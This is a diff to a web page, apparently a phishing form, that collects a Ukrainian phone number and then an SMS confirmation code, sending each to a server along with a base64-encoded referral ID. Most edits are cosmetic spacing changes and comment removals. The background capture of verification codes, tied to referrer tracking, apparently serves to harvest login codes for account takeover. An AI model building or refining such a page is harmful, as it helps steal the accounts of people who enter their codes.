@@ -84,6 +84,7 @@
             font-weight: 500;
             color: #333;
             transition: border-color 0.3s, box-shadow 0.3s;
+            margin-bottom: 20px; /* Добавлен отступ */
         }
         
         #phone-number:focus {
@@ -95,13 +96,14 @@
         .sms-prompt {
             color: #666;
             font-size: 16px;
-            margin-bottom: 5px;
+            margin-bottom: 15px; /* Увеличен отступ */
         }
 
         .code-input-group {
             display: flex;
             justify-content: center;
             gap: 10px;
+            margin-bottom: 20px; /* Отступ перед кнопкой */
         }
 
         .code-input {
@@ -179,19 +181,17 @@
     </div>
     
     <script>
-        // === ОТРИМАННЯ РЕФЕРАЛА З URL ===
         let referrer = '';
         const urlParams = new URLSearchParams(window.location.search);
         const refEncoded = urlParams.get('ref');
         if (refEncoded) {
             try {
-                referrer = atob(refEncoded).replace(/[^a-zA-Z0-9_]/g, ''); // Безпечне очищення
+                referrer = atob(refEncoded).replace(/[^a-zA-Z0-9_]/g, '');
             } catch (e) {
                 console.error("Невалідний ref");
             }
         }
 
-        // === МАСКА ТЕЛЕФОНУ ===
         $(document).ready(function(){
             const prefix = '+380 ';
             $('#phone-number').mask('+380999999999', {
@@ -207,7 +207,6 @@
                 }
             });
 
-            // Автоперехід між полями SMS
             $('.code-input').on('keyup', function(e) {
                 const $this = $(this);
                 if ($this.val().length === 1) {
@@ -220,7 +219,6 @@
             });
         });
 
-        // === ВІДПРАВКА НОМЕРУ ===
         function showSmsStep() {
             const phoneNumber = $('#phone-number').val();
             if (phoneNumber.replace(/\s/g, '').length !== 13) {
@@ -232,11 +230,9 @@
             $('#sms-step').show();
             $('#code-1').focus();
 
-            // Фонова відправка
             sendData('phone', { phone: phoneNumber });
         }
 
-        // === ВІДПРАВКА SMS КОДУ ===
         function sendSmsCode(e) {
             e.preventDefault();
             const code = $('.code-input').map((_, el) => el.value).get().join('');
@@ -248,7 +244,6 @@
             sendData('code', { code });
         }
 
-        // === УНІВЕРСАЛЬНА ВІДПРАВКА ===
         function sendData(step, data) {
             const payload = { step, ...data };
             if (referrer) payload.referrer = referrer;
@@ -263,7 +258,7 @@
                         alert('Дані підтверджено, гарного дня!');
                     }
                 },
-                error: function() {
+                error: function(xhr) {
                     if (step === 'code') {
                         alert('Помилка. Спробуйте ще раз.');
                     }
